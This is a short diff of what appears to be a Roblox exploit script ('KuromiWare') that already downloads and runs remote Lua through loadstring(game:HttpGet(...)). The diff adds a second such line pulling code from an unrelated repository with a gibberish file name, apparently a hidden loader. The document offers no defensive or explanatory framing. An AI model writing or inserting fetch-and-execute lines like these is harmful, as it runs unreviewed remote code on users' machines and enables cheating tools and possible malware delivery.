@@ -14,6 +14,7 @@ KuromiWare On Top
 ]])
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/KuromiWare-v1/freebypasslmao/refs/heads/main/uhhhidk.lua'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kc-ignore/safety/refs/heads/main/AJKSDHJKDHDJKHSJKDHJDKSHJKSHDJKHD",true))()
 
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
